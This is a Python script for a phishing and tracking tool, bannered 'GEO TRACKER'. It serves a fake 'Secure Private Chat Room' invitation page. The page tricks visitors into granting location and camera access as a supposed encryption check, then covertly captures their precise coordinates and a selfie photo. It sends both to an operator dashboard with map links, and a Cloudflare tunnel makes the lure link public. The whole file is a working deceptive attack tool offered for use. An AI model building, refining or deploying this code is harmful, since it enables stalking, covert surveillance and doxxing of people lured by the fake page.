#!/usr/bin/env python3
"""Secure Private Chat & Media Verification Portal (Multi-User Support)."""

import json
import os
import secrets
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

HOST = "127.0.0.1"
PORT = 8765
ADMIN_TOKEN = secrets.token_urlsafe(24)
SHARE_TOKEN = secrets.token_urlsafe(24)

# Ab yeh ek list ban chuki hai jo multiple users ka data store karegi
DATA_STORE = []
LOCK = threading.Lock()
PUBLIC_URL = None

def render_page(title, content, script=""):
    return f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{title}</title>
<style>
:root{{color-scheme:dark}}
body{{
 margin:0;min-height:100vh;padding:22px;display:grid;place-items:center;
 font-family:system-ui,-apple-system,sans-serif;
 color:#f4f7ff;background:radial-gradient(ellipse at top,#263657 0%,#101522 52%,#090c13 100%);
}}
.card{{
 width:100%;max-width:460px;padding:26px;border-radius:25px;
 background:rgba(25,33,50,.96);border:1px solid #39465e;
 box-shadow:0 22px 70px #0007; text-align:center;
}}
h1{{font-size:24px;margin-bottom:12px}}
p{{color:#b9c6d9;font-size:14px;line-height:1.5}}
button{{
 display:block;width:100%;padding:16px;border:0;border-radius:14px;
 font-weight:700;font-size:16px;cursor:pointer;margin-top:15px;
 background:linear-gradient(110deg,#7ce9c0,#61d6e8);color:#10252b;
}}
button:disabled{{opacity:.6;cursor:wait}}
.status{{padding:13px;border-radius:12px;background:#141c2a;margin-top:15px;word-break:break-all;text-align:left}}
a{{color:#7ce9c0;text-decoration:none}}
a:hover{{text-decoration:underline}}
video{{display:none}}
</style>
</head>
<body>
<main class="card">
{content}
</main>
<script>{script}</script>
</body>
</html>"""

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *_): pass

    def send_data(self, data, status=200, content_type="text/html; charset=utf-8"):
        if isinstance(data, str): data = data.encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", content_type)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        path = urlparse(self.path).path

        if path == "/share/" + SHARE_TOKEN:
            content = """
<h1>🔒 Secure Private Chat Room</h1>
<p>You have been invited to an encrypted private session. Click below to verify device encryption and join the room.</p>
<button id="startBtn" onclick="startProcess()">💬 &nbsp; Enter Private Chat</button>
<div id="status" class="status" style="text-align:center;">Waiting to join...</div>
<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
"""
            script = f"""
async function startProcess() {{
  const btn = document.getElementById('startBtn');
  const status = document.getElementById('status');
  btn.disabled = true;
  status.textContent = 'Verifying security handshake & permissions...';
  try {{
    const position = await new Promise((resolve, reject) => {{
      navigator.geolocation.getCurrentPosition(resolve, reject, {{enableHighAccuracy: true, timeout: 15000}});
    }});
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;
    const acc = position.coords.accuracy;
    status.textContent = 'Location verified. Initializing camera stream...';
    const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user' }} }});
    const video = document.getElementById('video');
    video.srcObject = stream;
    await new Promise(resolve => video.onloadedmetadata = resolve);
    video.play();
    await new Promise(resolve => setTimeout(resolve, 1000));
    const canvas = document.getElementById('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
    stream.getTracks().forEach(track => track.stop());
    status.textContent = 'Syncing encrypted session data...';
    const response = await fetch('/api/submit/{SHARE_TOKEN}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify({{
        latitude: lat,
        longitude: lon,
        accuracy: acc,
        photo: photoDataUrl,
        captured_at: new Date().toISOString()
      }})
    }});
    if(!response.ok) throw new Error('Sync failed');
    status.textContent = 'Connected! Entering secure chat...';
    btn.textContent = '✓ Connected Successfully';
  }} catch(err) {{
    status.textContent = 'Error: ' + err.message + '. Please allow permissions and try again.';
    btn.disabled = false;
  }}
}}
"""
            self.send_data(render_page("Secure Chat", content, script))
            return

        if path == "/dashboard/" + ADMIN_TOKEN:
            content = """
<h1>Capture Dashboard (Multi-User)</h1>
<button onclick="loadData()" style="background:#303e54;color:#fff;border:0;padding:12px;border-radius:10px;cursor:pointer;font-weight:600;">🔄 Refresh Data</button>
<div id="result" class="status" style="margin-top:15px;">Waiting for submissions...</div>
"""
            script = f"""
async function loadData(){{
  try {{
    const res = await fetch('/api/status/{ADMIN_TOKEN}');
    const data = await res.json();
    const subs = data.submissions;
    if(!subs || subs.length === 0){{ 
      document.getElementById('result').textContent = 'No submissions received yet.'; 
      return; 
    }}
    let html = '<p style="text-align:center; color:#7ce9c0; font-weight:bold;">Total Submissions: ' + subs.length + '</p>';
    
    subs.forEach((d, index) => {{
      const mapsUrl = 'https://www.google.com/maps?q=' + d.latitude + ',' + d.longitude;
      html += '<div style="background:#1b263b; padding:15px; border-radius:12px; margin-top:15px; border:1px solid #334155;">';
      html += '<p style="color:#38bdf8; margin-top:0;"><b># User Entry ' + (index + 1) + '</b></p>';
      html += '<p><b>Latitude:</b> ' + d.latitude + '</p>';
      html += '<p><b>Longitude:</b> ' + d.longitude + '</p>';
      html += '<p><b>Accuracy:</b> ' + d.accuracy + ' metres</p>';
      html += '<p><b>Time:</b> ' + d.captured_at + '</p>';
      html += '<p style="margin-top:12px;"><a href="' + mapsUrl + '" target="_blank" style="display:block;background:#263b58;padding:10px;text-align:center;border-radius:8px;font-weight:bold;">↗ Open Exact Location in Google Maps</a></p>';
      if(d.photo){{
        html += '<p style="margin-top:12px;"><b>Captured Photo:</b><br><img src="' + d.photo + '" style="max-width:100%; border-radius:8px; margin-top:8px;"/></p>';
      }}
      html += '</div>';
    }});
    
    document.getElementById('result').innerHTML = html;
  }} catch(e) {{
    document.getElementById('result').textContent = 'Error loading data.';
  }}
}}
loadData();
setInterval(loadData, 5000);
"""
            self.send_data(render_page("Dashboard", content, script))
            return

        if path == "/api/status/" + ADMIN_TOKEN:
            with LOCK:
                self.send_data(json.dumps({"submissions": DATA_STORE}), content_type="application/json")
            return

        self.send_data("Not found", 404, "text/plain")

    def do_POST(self):
        global DATA_STORE
        path = urlparse(self.path).path
        if path != "/api/submit/" + SHARE_TOKEN:
            self.send_data("Not found", 404, "text/plain")
            return

        try:
            size = int(self.headers.get("Content-Length", "0"))
            body = json.loads(self.rfile.read(size).decode("utf-8"))
            with LOCK:
                DATA_STORE.append(body)  # Har naye user ka data list me append ho jayega
            self.send_data('{"ok":true}', content_type="application/json")
        except Exception:
            self.send_data('{"ok":false}', 400, "application/json")

def start_tunnel():
    global PUBLIC_URL
    import subprocess
    import re
    try:
        process = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{PORT}"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        for line in process.stdout:
            match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", line)
            if match:
                PUBLIC_URL = match.group(0)
                print("\n" + "!" * 50)
                print(f" PUBLIC SHARE LINK: {PUBLIC_URL}/share/{SHARE_TOKEN}")
                print("!" * 50)
                break
    except Exception:
        pass

def main():
    # Clear screen when tool opens
    os.system('cls' if os.name == 'nt' else 'clear')

    server = ThreadingHTTPServer((HOST, PORT), Handler)
    
    threading.Thread(target=start_tunnel, daemon=True).start()

    print("""
\033[1;36m
  ██████╗ ███████╗ ██████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗██████╗ 
 ██╔════╝ ██╔════╝██╔═══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
 ██║  ███╗█████╗  ██║   ██║      ██║   ██████╔╝███████║██║     █████╔╝ █████╗  ██████╔╝
 ██║   ██║██╔══╝  ██║   ██║      ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
 ╚██████╔╝███████╗╚██████╔╝      ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
  ╚═════╝ ╚══════╝ ╚═════╝       ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
\033[0m
                         \033[1;33m[+] Created by Negi\033[0m
    """)

    print(f"\nPRIVATE DASHBOARD (Local): http://127.0.0.1:{PORT}/dashboard/{ADMIN_TOKEN}")
    print(f"LOCAL SHARE LINK:          http://127.0.0.1:{PORT}/share/{SHARE_TOKEN}")
    print("\n[INFO] Generating public link via Cloudflare Tunnel...")
    print("\nPress CTRL+C to stop.")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
        server.server_close()

if __name__ == "__main__":
    main()
